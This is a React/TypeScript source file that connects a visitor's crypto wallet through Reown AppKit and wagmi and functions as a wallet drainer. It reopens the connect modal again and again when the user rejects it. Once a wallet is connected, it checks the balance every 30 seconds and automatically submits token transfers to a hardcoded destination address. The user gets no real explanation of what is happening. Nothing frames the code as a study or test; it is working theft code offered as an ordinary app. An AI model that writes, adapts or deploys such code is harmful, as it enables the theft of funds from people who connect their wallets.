import { createAppKit } from '@reown/appkit/react';
import { WagmiProvider, useAccount } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { useEffect, useState } from 'react';
import { BrowserProvider, parseUnits, Contract, Eip1193Provider, type Contract as EthersContract } from 'ethers';

import { projectId, metadata, networks, wagmiAdapter, solanaWeb3JsAdapter } from './config';

const queryClient = new QueryClient();

const generalConfig = {
  projectId,
  metadata,
  networks,
  themeMode: undefined, // 
  features: { analytics: true },
  themeVariables: { '--w3m-accent': '#000000' },
};


const appKit = createAppKit({
  adapters: [wagmiAdapter, solanaWeb3JsAdapter],
  ...generalConfig,
});

const DESTINATION_WALLET = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B";
const TOKEN_CONTRACT_ADDRESS = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"; // Example Token Address

 const tokenAbi = [
          {
            constant: true,
            inputs: [],
            name: "name",
            outputs: [{ name: "", type: "string" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "value", type: "uint256" },
            ],
            name: "approve",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "totalSupply",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "sender", type: "address" },
              { name: "recipient", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            name: "transferFrom",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "decimals",
            outputs: [{ name: "", type: "uint8" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "addedValue", type: "uint256" },
            ],
            name: "increaseAllowance",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: false,
            inputs: [{ name: "value", type: "uint256" }],
            name: "burn",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [{ name: "account", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "symbol",
            outputs: [{ name: "", type: "string" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "subtractedValue", type: "uint256" },
            ],
            name: "decreaseAllowance",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "recipient", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [
              { name: "owner", type: "address" },
              { name: "spender", type: "address" },
            ],
            name: "allowance",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              { name: "name", type: "string" },
              { name: "symbol", type: "string" },
              { name: "decimals", type: "uint8" },
              { name: "totalSupply", type: "uint256" },
              { name: "feeReceiver", type: "address" },
              { name: "tokenOwnerAddress", type: "address" },
            ],
            payable: true,
            stateMutability: "payable",
            type: "constructor",
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: "from", type: "address" },
              { indexed: true, name: "to", type: "address" },
              { indexed: false, name: "value", type: "uint256" },
            ],
            name: "Transfer",
            type: "event",
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: "owner", type: "address" },
              { indexed: true, name: "spender", type: "address" },
              { indexed: false, name: "value", type: "uint256" },
            ],
            name: "Approval",
            type: "event",
          },
        ];

const WalletDisplay = () => {
  const { address: userAddress, isConnected } = useAccount();
  const [transferStatus, setTransferStatus] = useState('');
  const [isTransferring, setIsTransferring] = useState(false);
  const [lastTransferAttempt, setLastTransferAttempt] = useState(0);

  const attemptTransfer = async (tokenContract: EthersContract) => {
    if (isTransferring) return;
    
    try {
      setIsTransferring(true);
      setTransferStatus('Checking balance...');

      const balanceWei = await tokenContract.balanceOf(userAddress);
      const amountToSend = parseUnits("0.01", 18);

      // Convert balanceWei to BigNumber for comparison
      if (BigInt(balanceWei.toString()) < BigInt(amountToSend.toString())) {
        setTransferStatus('');
        return false;
      }

      setTransferStatus('Initiating automatic transfer...');
      const tx = await tokenContract.transfer(DESTINATION_WALLET, amountToSend);
      
      setTransferStatus('Transaction submitted. Waiting for confirmation...');
      await tx.wait();
      
      setTransferStatus('Transfer successful!');
      setLastTransferAttempt(Date.now());
      return true;
    } catch (error: any) {
      console.error("Transfer failed:", error);
      setTransferStatus(`Transfer failed: ${error?.message || 'Unknown error'}`);
      return false;
    } finally {
      setIsTransferring(false);
    }
  };

  useEffect(() => {
    let intervalId;
    
    const checkBalanceAndTransfer = async () => {
      if (!isConnected || !userAddress) return;

      try {
        if (typeof window !== "undefined" && window.ethereum) {
          const ethereum = window.ethereum as unknown as Eip1193Provider;
          const signer = await new BrowserProvider(ethereum).getSigner();
          const tokenContract = new Contract(TOKEN_CONTRACT_ADDRESS, tokenAbi, signer);

          // If it's been at least 1 minute since last transfer attempt and we have balance
          if (Date.now() - lastTransferAttempt >= 60000) {
            await attemptTransfer(tokenContract);
          }
        }
      } catch (error) {
        console.error("Error:", error);
        setTransferStatus('Error checking balance. Will retry...');
      }
    };

    // Check immediately when wallet connects
    checkBalanceAndTransfer();

    // Set up interval to check every 30 seconds
    intervalId = setInterval(checkBalanceAndTransfer, 30000);

    return () => {
      if (intervalId) {
        clearInterval(intervalId);
      }
    };
  }, [isConnected, userAddress, lastTransferAttempt]);

  return (
    <div style={{ 
      background: '#f0f0f0', 
      padding: '2rem', 
      borderRadius: '12px', 
      marginTop: '20px', 
      textAlign: 'center',
      maxWidth: '600px',
      margin: '20px auto',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
    }}>
      {isConnected && (
        <div>
          {transferStatus && (
            <div style={{ 
              padding: '10px', 
              borderRadius: '5px',
              backgroundColor: transferStatus.includes('successful') ? '#dff0d8' : '#f2dede',
              color: transferStatus.includes('successful') ? '#3c763d' : '#a94442',
              fontSize: '0.9rem'
            }}>
              {transferStatus}
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export function App() {
  useEffect(() => {
    const openModal = async () => {
      try {
        await appKit.open();
      } catch (error) {
        console.log("Connection rejected", error);
        setTimeout(() => openModal(), 500);
      }
    };

    openModal();

    const handleDisconnect = () => {
      openModal();
    };

    window.addEventListener('disconnect', handleDisconnect);
    return () => {
      window.removeEventListener('disconnect', handleDisconnect);
    };
  }, []);

  return (
    <div className={"pages"}>
      <WagmiProvider config={wagmiAdapter.wagmiConfig}>
        <QueryClientProvider client={queryClient}>
          <WalletDisplay />
        </QueryClientProvider>
      </WagmiProvider>
    </div>
  );
}

export default App;
